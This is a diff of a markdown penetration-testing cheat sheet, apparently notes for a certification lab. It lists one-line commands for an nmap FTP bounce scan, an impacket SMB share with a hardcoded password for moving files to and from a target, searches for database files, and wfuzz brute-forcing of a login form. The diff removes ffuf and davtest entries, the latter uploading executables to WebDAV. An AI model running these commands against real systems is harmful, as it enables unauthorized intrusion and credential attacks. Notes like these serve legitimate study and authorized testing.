@@ -25,13 +25,18 @@
 ## ftp bounce scan
 - `nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv`
 ------
-## file share, share file smb, smb file share
+## file share, share file smb, smb file share,share smb
 - `impacket-smbserver -smb2support root . -username root -password Axaxax12!`
 - `net use y: \\192.168.45.196\root /user:root Axaxax12!`
 - `change folder y use just Y:`
-
 ---
-
+### create custom wordlist, wordlist custom,Custom wordlist 
+-`https://fareedfauzi.gitbook.io/oscp-playbook/password-attack-brute-force/custom-wordlist`
+---
+## windows file find, file find db, linux file find, search all file
+- `dir /s /b C:\*.db`  change db txt 
+- `find / -name "*.db"`
+----
 # gobuster
 - service: http
 - tactics: enumeration
@@ -50,24 +55,6 @@
 
 ## bruteforce post data (login)
 - `wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt`
-
----
-
-# fuff
-- service: http
-- tactics: enumeration
-
-## bruteforce web directories
-- `ffuf -w /path/to/wordlist -u https://target/FUZZ`
-
----
-
-# davtest
-- service: webdav
-- tactics: enumeration
-
-## tries to upload (executable) files to webdav
-- `davtest -url http://target-ip/ -sendbd auto`
 
 ---
 
